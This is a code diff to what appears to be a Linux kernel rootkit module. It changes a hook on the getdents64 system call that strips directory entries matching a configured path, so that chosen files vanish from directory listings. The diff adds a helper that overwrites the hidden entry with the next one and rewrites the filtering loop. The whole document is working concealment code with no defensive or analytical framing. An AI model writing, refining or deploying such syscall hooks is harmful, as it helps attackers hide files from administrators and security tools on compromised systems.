@@ -24,6 +24,21 @@ struct linux_dirent {
 	char		d_name[1];
 };
 
+/// @brief Replace a dirent's content with the next's, expanding
+///     d_reclen to contain the new size while setting to 0 the trailing
+///     bytes.
+/// @param dirent dirent to erase.
+/// @attention dirent must not be the last in the array.
+static void shift_back_switch(struct linux_dirent *dirent)
+{
+    struct linux_dirent *next = (void *)dirent + dirent->d_reclen;
+    size_t prev_reclen = dirent->d_reclen;
+    
+    memcpy(dirent, next, next->d_reclen);
+    memset((void *)dirent + dirent->d_reclen, 0, prev_reclen);
+    dirent->d_reclen += prev_reclen;
+}
+
 static long __x64_sys_getdents64_hook(const struct pt_regs *regs)
 {
     // syscall args
@@ -59,8 +74,6 @@ static long __x64_sys_getdents64_hook(const struct pt_regs *regs)
     }
 
     // perform original getdents64 on user supplied buffer
-    // TODO: avoid user supplied buffer and pass a private buffer instead
-    // args.si = (unsigned long)filtered;
     res = hook_original__x64_sys_getdents64(regs);
     if (res < 0) {
         goto exit;
@@ -95,27 +108,25 @@ static long __x64_sys_getdents64_hook(const struct pt_regs *regs)
             dirent_name = &cur_dirent->d_name[1];
 
             // compare the rest of the path with the file name
-            if (strncmp(hide_cursor, dirent_name, dirent_name_len))
-                goto next;
-
-            // if dirent_name is not the exact end of hide, do nothing
-            if (*(hide_cursor + dirent_name_len + 1) != '\0')
-                goto next;
             
-            // copy next dirent, subtract from res, and continue without incrementing i or cur_dirent
-            res -= cur_dirent->d_reclen;
-            memcpy(cur_dirent, (void *)cur_dirent + cur_dirent->d_reclen,
-                ((struct linux_dirent *)((void *)cur_dirent + cur_dirent->d_reclen))->d_reclen);
-            continue;
-
-        next:
-            i += cur_dirent->d_reclen;
-            cur_dirent = (struct linux_dirent *)((void *)filtered + i);
+            // if dirent_name is not the exact ending of hide, 
+            // pass on
+            if (strcmp(hide_cursor, dirent_name)) {
+                i += cur_dirent->d_reclen;
+                cur_dirent = (struct linux_dirent *)((void *)filtered + i);
+                continue;
+            }
+            
+            // override with content of the next dirent if cur is not last,
+            // otherwise set to 0 and decrease res
+            if (cur_dirent->d_reclen + i < res) {
+                shift_back_switch(cur_dirent);
+            } else {
+                res -= cur_dirent->d_reclen;
+                memset(cur_dirent, 0, cur_dirent->d_reclen);
+            }
         }
     }
-
-    // zero out the bytes left over from truncating res
-    memset((void *)filtered + res, 0, count - res);
 
 exit:
     // copy filtered buffer to user
